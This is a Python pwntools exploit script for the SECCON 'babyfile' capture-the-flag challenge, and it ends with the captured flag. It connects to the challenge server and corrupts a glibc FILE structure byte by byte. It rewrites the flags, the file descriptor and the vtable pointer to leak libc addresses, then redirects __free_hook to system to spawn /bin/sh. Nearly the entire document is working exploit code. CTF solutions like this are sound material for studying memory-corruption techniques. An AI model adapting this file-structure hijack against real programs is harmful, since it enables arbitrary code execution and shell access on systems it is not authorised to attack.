#!/usr/bin/env python3
import struct

from pwn import *


STDIN_FILENO = 1
STDOUT_FILENO = 1
OFFSETOF_FLAGS = 0
FLAGS = 0xfbad2488
_IO_UNBUFFERED = 2
_IO_NO_WRITES = 8
_IO_IN_BACKUP = 0x100
OFFSETOF_IO_READ_PTR = 8
OFFSETOF_IO_READ_END = 16
OFFSETOF_IO_READ_BASE = 24
OFFSETOF_IO_WRITE_BASE = 32
OFFSETOF_IO_WRITE_PTR = 40
OFFSETOF_IO_WRITE_END = 48
OFFSETOF_IO_BUF_BASE = 56
OFFSETOF_IO_BUF_END = 64
OFFSETOF_IO_SAVE_BASE = 72
OFFSETOF_IO_SAVE_END = 88
OFFSETOF_MARKERS = 96
OFFSETOF_FILENO = 112
OFFSETOF_UNUSED = 196
OFFSETOF_VTABLE = 216

# x/21a &_IO_file_jumps
# <_IO_file_jumps>:	0x0	0x0
# <_IO_file_jumps+16>:	 <_IO_new_file_finish>	 <_IO_new_file_overflow>
# <_IO_file_jumps+32>:	 <_IO_new_file_underflow>	 <__GI__IO_default_uflow>
# <_IO_file_jumps+48>:	 <__GI__IO_default_pbackfail>	 <_IO_new_file_xsputn>
# <_IO_file_jumps+64>:	 <__GI__IO_file_xsgetn>	 <_IO_new_file_seekoff>
# <_IO_file_jumps+80>:	 <_IO_default_seekpos>	 <_IO_new_file_setbuf>
# <_IO_file_jumps+96>:	 <_IO_new_file_sync>	 <__GI__IO_file_doallocate>
# <_IO_file_jumps+112>:	 <__GI__IO_file_read>	 <_IO_new_file_write>
# <_IO_file_jumps+128>:	 <__GI__IO_file_seek>	 <__GI__IO_file_close>
# <_IO_file_jumps+144>:	 <__GI__IO_file_stat>	 <_IO_default_showmanyc>
# <_IO_file_jumps+160>:	 <_IO_default_imbue>
IO_FILE_JUMPS_LSB = 0xa0
OFFSETOF_FINISH = 16
OFFSETOF_OVERFLOW = 24
OFFSETOF_UNDERFLOW = 32
OFFSETOF_PBACKFAIL = 48
OFFSETOF_SYNC = 96
OFFSETOF_DOALLOCATE = 104


def connect():
    if args.LOCAL:
        return gdb.debug(["babyfile/chall"], api=True)
    else:
        return remote("babyfile.seccon.games", 3157)


def flush(tube):
    tube.sendlineafter(b"> ", b"1")


def trick(tube, offset, value):
    tube.sendlineafter(b"> ", b"2")
    tube.sendlineafter(b"offset: ", str(offset).encode())
    tube.sendlineafter(b"value: ", str(value).encode())


def trickq(tube, offset, value):
    for i, b in enumerate(struct.pack("<Q", value)):
        trick(tube, offset + i, b)


def tricks(tube, offset, value):
    for i, b in enumerate(value + b"\0"):
        trick(tube, offset + i, b)


def exit(tube):
    tube.sendlineafter(b"> ", b"0")


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("directory /usr/src/glibc-2.31/libio")
            tube.gdb.execute("handle SIGALRM nopass")
            tube.gdb.execute("b fflush")
            tube.gdb.continue_nowait()
        trick(tube, OFFSETOF_FLAGS, ((FLAGS & ~_IO_NO_WRITES) | _IO_UNBUFFERED) & 0xff)
        trick(tube, OFFSETOF_FILENO, STDOUT_FILENO)
        trick(tube, OFFSETOF_VTABLE, IO_FILE_JUMPS_LSB + OFFSETOF_OVERFLOW - OFFSETOF_SYNC)
        flush(tube)  # _IO_new_file_overflow() allocates buffers
        trick(tube, OFFSETOF_VTABLE, IO_FILE_JUMPS_LSB)
        trick(tube, OFFSETOF_IO_WRITE_BASE, 0)
        trick(tube, OFFSETOF_IO_READ_END, 0)  # for new_do_write()
        trick(tube, OFFSETOF_IO_WRITE_PTR, 0xff)
        flush(tube)
        leak = tube.read(0xff)
        libc = struct.unpack("<Q", leak[0x8:0x10])[0] - 0x1ed5c0
        print("libc=" + hex(libc))
        assert libc & 0xfff == 0
        fp = struct.unpack("<Q", leak[0x28:0x30])[0] - 0xe0
        print("fp=" + hex(fp))
        free_hook = libc + 0x1eee48
        system = libc + 0x52290
        bss = libc + 0x1ed7a0
        trick(tube, OFFSETOF_FILENO, STDIN_FILENO)
        trickq(tube, OFFSETOF_MARKERS, bss)  # force least_mark to 0
        trickq(tube, OFFSETOF_IO_SAVE_BASE, free_hook)
        # current_Bsize
        # 9 because of `*--fp->_IO_read_ptr = c;`
        trickq(tube, OFFSETOF_IO_SAVE_END, free_hook + 9)
        trickq(tube, OFFSETOF_IO_READ_BASE, fp + OFFSETOF_UNUSED)
        trickq(tube, OFFSETOF_IO_READ_PTR, fp + OFFSETOF_UNUSED + 9)
        trick(tube, OFFSETOF_FLAGS + 1, ((FLAGS & ~_IO_IN_BACKUP) >> 8) & 0xff)
        trick(tube, OFFSETOF_VTABLE, IO_FILE_JUMPS_LSB + OFFSETOF_PBACKFAIL - OFFSETOF_SYNC)
        trickq(tube, OFFSETOF_UNUSED, system)
        flush(tube)
        trick(tube, OFFSETOF_FLAGS + 1, ((FLAGS | _IO_IN_BACKUP) >> 8) & 0xff)
        trickq(tube, OFFSETOF_IO_READ_BASE, fp + OFFSETOF_UNUSED)
        trickq(tube, OFFSETOF_IO_READ_PTR, fp + OFFSETOF_UNUSED)
        bin_sh = b"/bin/sh"
        trickq(tube, OFFSETOF_IO_READ_END, fp + OFFSETOF_UNUSED + len(bin_sh) + 1)
        tricks(tube, OFFSETOF_UNUSED, bin_sh)
        flush(tube)
        tube.interactive()
        # SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}


if __name__ == "__main__":
    main()
